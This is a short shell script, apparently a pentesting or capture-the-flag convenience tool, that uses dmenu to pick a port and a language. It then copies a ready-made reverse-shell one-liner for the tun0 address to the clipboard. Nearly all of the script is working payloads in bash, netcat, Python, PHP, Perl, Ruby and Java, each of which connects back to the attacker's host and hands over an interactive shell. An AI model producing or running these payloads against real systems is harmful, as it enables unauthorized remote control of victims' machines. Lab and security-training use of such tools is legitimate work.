#!/bin/sh

# -- Just a dmenu wrapper --
# It just needs a port and a revshell type
# and u get a revshell with ur tun0 ip and
# the port u set
# Created by M4t35Z


# Needed variables
tun0_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet \K[\d.]+')
port="$($1 | dmenu -p "Gimme a port u wanna listen on")"

# Replace vars if they are empty
case "" in
    $tun0_ip) tun0_ip="10.0.0.1" ;;
esac

case "" in
    $port) port=1234 ;;
esac

# The Juicy part
case "$(printf "bash\\nnc(long)\\nnc(-e)\\npython\\nphp\\nperl\\nruby\\njava" | dmenu -i -p "R3vSh3LLZ")" in

    "bash") echo -n \
        "bash -i >& /dev/tcp/$tun0_ip/$port 0>&1" \
        | xclip -selection clipboard ;;

    "nc(long)") echo -n \
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f" \
        | xclip -selection clipboard ;;

    "nc(-e)") echo -n \
        "nc -e /bin/sh $tun0_ip $port" \
        | xclip -selection clipboard ;;

    "python") echo -n \
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'" \
        | xclip -selection clipboard ;;

    "php") echo -n \
        "php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'" \
        | xclip -selection clipboard ;;

    "perl") echo -n \
        "perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'" \
        | xclip -selection clipboard ;;

    "ruby") echo -n \
        "ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'" \
        | xclip -selection clipboard ;;

    "java") echo -n \
        "r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()" \
        | xclip -selection clipboard ;;
esac
